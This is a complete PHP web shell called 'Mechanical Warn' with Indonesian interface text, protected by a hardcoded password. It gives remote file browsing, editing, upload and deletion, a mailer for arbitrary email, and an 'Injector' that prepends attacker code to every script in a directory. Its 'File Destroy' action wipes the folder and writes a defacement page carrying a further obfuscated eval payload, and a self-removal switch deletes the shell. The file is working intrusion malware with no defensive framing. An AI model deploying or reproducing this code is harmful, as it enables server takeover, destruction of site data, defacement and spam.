<?php 
$user = "hieki";
$pass = "password";

 if ((@$_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass)){
  header("WWW-Authenticate: Basic realm=\"Mechanical Warn\"");
  header("HTTP/1.0 401 Unauthorized");
  exit();
 } ?>

 <!--Header-->
<title><?=$_SERVER['HTTP_HOST'] . " - Hie"; ?></title>
<font color="blue"><body bgcolor="black"><div align="center"><pre>
+------------------------+
Mechanical Warn | mh@nkk
+------------------------+
<br>
#[Uname]: <?php echo php_uname() . "
"; ?>
#[Server]: <?=$_SERVER['HTTP_HOST'] . "
"; ?>
#[dir]: <?php echo getcwd(); ?>/<?php $current_file_name = basename($_SERVER['PHP_SELF']);
echo $current_file_name . "
"; ?>
</pre>
<!--End Header-->

<!--Menu-->
<br><font><center>|
    <a href="?injector">Injector</a>|
    <a href="?file_manager">File Manager</a>|
    <a href="?uploader">Uploader</a>|
    <a href="?mailer">Mailer</a>|
    <a href="?delete">File Destroy</a>|
    <a href="?die">Self Remove</a>|
</center></font><br>
<!--//End Menu-->

<!--//Uploader -->
<?php if(isset($_GET['uploader'])){
    echo "<form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>";} 
$root = $_SERVER['DOCUMENT_ROOT'];
$files = @$_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload => <a href='$web/$files' target='_blank'><u>$web/$files</u></a>";} 
		else {echo "gagal upload di document root.";}}
				else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "sukses upload <b>$files</b> di folder ini";}
		else {echo "gagal upload";}}} ?>
<!--//End Uploader -->

<!--//Injector-->
<?php if(isset($_GET['injector'])){echo '<br><center><br><font>Injector Code</font><br><br><form action="" method="POST"><textarea type="text" name="code" rows="13" cols="80" placeholder="Injector Code"></textarea><br><br><input type="submit" name="submit" value="Submit" /></form></div>';} ?>
            <?php 
            if (isset($_POST['submit'])) {
                $gwk = $_POST['code'];$blv = base64_encode($gwk);
                $cwd = getcwd();$tol = 'http://'.$_SERVER['HTTP_HOST'];
                $crotz = $_SERVER['DOCUMENT_ROOT'];
                $kon = $tol.$crotz;
                $cwd = getcwd();
                $ntpz = $cwd;
                if (empty($gwk)) {
                    echo '<font color=\'red\'>Masukan Malcode mu!!! :P</font>';}
                    if (!empty($gwk)) {
                        if ($pasi = opendir($ntpz)) {
                            echo 'Website: '.$kon.'<br><br>';echo 'Looking in '.$ntpz.'';
                            while ($ken2 = readdir($pasi)) {
                                if ($ken2 != '.' && $ken2 != '..' && $ken2 != 'rev.php' && $ken2 != 'REV.php' && $ken2 != '.htaccess' && $ken2 != 'php.ini' && $ken2 != 'admin' && $ken2 != 'images' && $ken2 != 'image' && $ken2 != 'img' && $ken2 != 'phpmyadmin' && $ken2 != 'files' && $ken2 != '.ftpquota' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'xml' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'jpg' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'ico' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'png' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'jpeg' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'txt' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'exe' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'html' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'shtml' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'htm' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'ico' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'css' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'zip' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'sql' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'js' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'py' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'pl' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'md' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'gif' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'tar.gz' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'c' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'sql.zip' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'out') {
                                    echo '<center><a target="_blank" href="'.$ken2.'">'.$ken2.'</a><font>&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
                            $jmb = base64_decode($blv);
                            $jmb .= file_get_contents($ken2);
                        file_put_contents($ken2, $jmb); 
                    echo '</center>';} }}}}?><br><br>
<!--//End Injector-->

<!--//Mailer-->
<?php if(isset($_GET['mailer'])){
echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><br><label  for="tujuan">For :</label><input  type="text" id="tujuan" name="tujuan" placeholder="kim@mail.com"/><br><label  for="subjek">Subject :</label><input  type="text" id="subjek" name="subjek"/><br><textarea name="pesan" id="pesan" rows="10" cols="30">Message</textarea><input type="hidden" name="send"><br><button id="Send">Send</button></form></center>';}?>
<?php if(@isset($_POST['send'])){
    ini_set( 'display_errors', 1 );   
    error_reporting( E_ALL );    
    $from    = 'mh@nkk';    
    $to      = $_POST['tujuan'];
    $subject = $_POST['subjek'];
    $message = $_POST['pesan'];   
    $headers = "From:" . $from;    
    mail($to,$subject,$message, $headers);    
    echo "Pesan email sudah terkirim ke ".$to."";}?>
<!--//End Mailer-->

<!--//File Destroy-->  <!-- Setelah semua terhapus akses index.php?uploader-->
<?php if (isset($_GET["delete"])) { 
	$files = scandir(__DIR__); 
	foreach ($files as $file) { 
		if (is_file($file)) {  
			unlink($file); }} 
			echo "All Files Deleted and Creating New Index";
			echo " Silahkan akses index.php?ndelik";
			$f = fopen("index.php", "w") or die("Unable to open file!"); 
			fwrite($f, base64_decode('SGFja2VkIEJ5IC4vIE1oQG5rayAtIE1lY2hhbmljYWwgV2Fybgo8P3BocAovKgpUb29scyBDb2RlZCBCeSAuL21oQG5rayAgICAgICAgIAoqLwokbWhhbmtrID0gIlYvY252MmQrd3Y2QnlUL004bVQxejFBOFBmTEpvbm1uWVNBd1hRbGR4VjNaeXo3SXZHM2NYMzZJOEN6WnhXbU1kZlB3cFlBWi80b3RkbW83RVFSNE5KWGcrZ0xsdE9acGVlRytwQ3N0T0l5Y2NOeWtTNW5vWUFSSU40aWpINVMwZUZZR0JrSEIzUHB3RzFnYUdxWm54ZTVEMGtHUmZpbTYweTdScXlLdEpMWFVtZUplTS9XVUhzbFduSmVCdUpNOEg0K2dJT01OVi8vWmVrakd2OC9YM2FPZG1UNk1WOEppKzVVQnJ0NDI5M2JjbHI2dVluVVJvVVM4SDdaMXRBMTRuR3kzOUtpN3R2OFh2cy80UlFXTGlleVlQcmRGWHpxM1Y4bXl0MnpQdjZ6aG1WKzdiYXAzeDRBUVNMWnN2WU9paDZGWllWKzBoZkI0QUNQVW5OekFWM0RFWC9NN3YxdVo5UElJQlN4NGRBQkV5RVhpTXFvZ1lZNTJvV25KUk5TWTRpSmFtSDV4eElLb2dvTmxvWmUyNnBtQkJvcVQrYUFnY3k5M2FYeFNKNWlSYTJ4cW80WE1tcDJhTVoyNkRvcElSZFE0Q3JSd1RNTmFzMkN3NEUzQzFqbFVJZDBqRlNyRHBWaWl0bUZSbGtPdEp0NzU4bHZaNi9CV1drVnBUL2UvSTBWZWtRbXNpOGNMeUNoUWUwTnhVS2J3Yk9IYm1ndDM5dnFDUU4yQnI0UEZ3czlhYkpWbGNpbi9hRlFwQndKZSsvVUF3R2cvS0ZRdEI0ZlJCb2JBIjsKJEpvZ2phID0gIj09Tk4xUmJEZXFKTXpHdk14d25uSkpuU0hwV1NkRTZjYW9QY2FGcHpucmRTeUhGTXZFZHl4SHJjekcyNVQ1RllYdUZZQzc4RkFlbGVWU0FtWTFsRiI7CmV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoc3RycmV2KHN0cl9yb3QxMygkSm9namEpKSkpKTsKZXhpdDsKPz4='));} ?>		
	<!--//End File Destroy-->

<!--//Self Remove-->
<?php
if (isset($_GET['die'])) {
	unlink(__FILE__);
	echo "Sayonara :)";}
?>
<!--//End Self Remove-->

<!--//Make File/Dir-->
<?php
if (isset($_GET['crt'])) {
	$mtd = $_GET['wch'];
		if($mtd === "file"){
			$file = fopen($_GET['nfile'], "w") or die("Unable to open file!");
			$isi = "Mechanical Warn\n";
			fwrite($file, $isi);
			fclose($file);
			header('location:?file_manager');
		}
		elseif($mtd === "dir"){
			$nmd = $_GET['nfile'];
    		mkdir($nmd);
    		header('location:?file_manager');
		}
}
?>
	
<!--//File Manager-->
<?php
    if (isset($_GET['file_manager'])) {
    	echo "<form action='?crt' method='get'><select name='wch'><option value='file'>Make File</option><option value='dir'>Make Dir</option></select><input type='text' name='nfile'><input type='submit' name='crt' value='Creat'></form>";
        echo '<table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font style="color:white;">Current Path : ';if(isset($_GET['path'])){$cwd=$_GET['path'];}else{$cwd = getcwd();} 
    $cwd = str_replace('\\','/',$cwd);$entah = explode('/',$cwd);
function permsa($bl){$mw = fileperms($bl);
    if (($mw & 0xC000) == 0xC000) {$hnk = 's';} 
    elseif (($mw & 0xA000) == 0xA000) {$hnk = 'l';} 
    elseif (($mw & 0x8000) == 0x8000) {$hnk = '-';} 
    elseif (($mw & 0x6000) == 0x6000) {$hnk = 'b';} 
    elseif (($mw & 0x4000) == 0x4000) {$hnk = 'd';} 
    elseif (($mw & 0x2000) == 0x2000) {$hnk = 'c';} 
    elseif (($mw & 0x1000) == 0x1000) {$hnk = 'p';} 
    else {$hnk = 'u';}$hnk .= (($mw & 0x0100) ? 'r' : '-');
        $hnk .= (($mw & 0x0080) ? 'w' : '-');
        $hnk .= (($mw & 0x0040) ?(($mw & 0x0800) ? 's' : 'x' ) :(($mw & 0x0800) ? 'S' : '-'));$hnk .= (($mw & 0x0020) ? 'r' : '-');$hnk .= (($mw & 0x0010) ? 'w' : '-');
        $hnk .= (($mw & 0x0008) ?(($mw & 0x0400) ? 's' : 'x' ) :(($mw & 0x0400) ? 'S' : '-'));$hnk .= (($mw & 0x0004) ? 'r' : '-');$hnk .= (($mw & 0x0002) ? 'w' : '-');
        $hnk .= (($mw & 0x0001) ?(($mw & 0x0200) ? 't' : 'x' ) :(($mw & 0x0200) ? 'T' : '-'));return $hnk;}
    foreach($entah as $yon=>$mhankk){ 
        if($mhankk == '' && $yon == 0){ $ngeod = true; 
    echo '<a href="?file_manager&path=/">/</a>'; continue; } 
    if($mhankk == '') continue; 
    echo '<a href="?file_manager&path='; 
    for($tod=0;$tod<=$yon;$tod++){ 
        echo "$entah[$tod]"; 
        if($tod != $yon) echo "/"; } echo '">'.$mhankk.'</a>/';}
        echo '</td></tr><tr><td>'; 
        if(isset($_GET['filesrc'])){ 
            echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '</tr></td></table><br />'; 
            echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}
            elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ 
            echo '</table><br /><center>'.$_POST['path'].'<br /><br />'; 

    if($_POST['opt'] == 'rename'){ 
        if(isset($_POST['newname'])){ 
            if(rename($_POST['path'],$cwd.'/'.$_POST['newname'])){ 
                echo '<font color="green">Change Name Done.</font><br />'; }
            else{ echo '<font color="red">Change Name Error.</font><br />'; } 
            $_POST['name'] = $_POST['newname']; } 
            echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="gox" /></form>';}

    elseif($_POST['opt'] == 'edit'){ 
        if(isset($_POST['src'])){ $kopet = fopen($_POST['path'],'w'); if(fwrite($kopet,$_POST['src'])){ 
            echo '<font color="green">Edit File Done.</font><br />'; }else{ echo '<font color="red">Edit File Error.</font><br />'; } 
            fclose($kopet); } 
            echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="gox" /></form>'; } echo '</center>';}
    else{ echo '</table><br /><center>'; 
        if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ 
            if($_POST['type'] == 'dir'){ 
                if(rmdir($_POST['path'])){ 
                    echo '<font color="green">Delete Dir Done.</font><br />'; }
                else{ 
                    echo '<font color="red">Delete Dir Error.</font><br />'; } }
    elseif($_POST['type'] == 'file'){ 
            if(unlink($_POST['path'])){ 
                echo '<font color="green">Delete File Done.</font><br />'; }
            else{ echo '<font color="red">Delete File Error.</font><br />'; } } } echo '</center>'; $yonchan = scandir($cwd); 
                    echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"><td><center>Name</center></td><td><center>Size</center></td><td><center>Permissions</center></td><td><center>Options</center></td>
                            </tr>'; 
                foreach($yonchan as $kawai){ 
                    if(!is_dir("$cwd/$kawai") || $kawai == '.' || $kawai == '..') continue; 
                    echo "<tr><td><a href=\"?file_manager&path=$cwd/$kawai\">$kawai</a></td><td><center>--</center></td><td><center>"; 
                    if(is_writable("$cwd/$kawai")) 
                        echo '<font color="green">'; 
                elseif(!is_readable("$cwd/$kawai")) 
                        echo '<font color="red">'; 
                        echo permsa("$cwd/$kawai"); 
                    if(is_writable("$cwd/$kawai") || !is_readable("$cwd/$kawai")) echo '</font>'; 
                    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$kawai\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kawai\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } 
                    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; 
            foreach($yonchan as $bl){ 
                if(!is_file("$cwd/$bl")) continue; 
                $lvu = filesize("$cwd/$bl")/1024; 
                $lvu = round($lvu,3); 
                if($lvu >= 1024){ $lvu = round($lvu/1024,2).' MB'; }else{ $lvu = $lvu.' KB'; } 
                echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$bl&path=$cwd\">$bl</a></td><td><center>".$lvu."</center></td><td><center>"; 
                if(is_writable("$cwd/$bl")) echo '<font color="green">';
            elseif(!is_readable("$cwd/$bl")) echo '<font color="red">'; 
                echo permsa("$cwd/$bl"); 
            if(is_writable("$cwd/$bl") || !is_readable("$cwd/$bl")) echo '</font>'; 
    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$bl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$bl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>
</div>
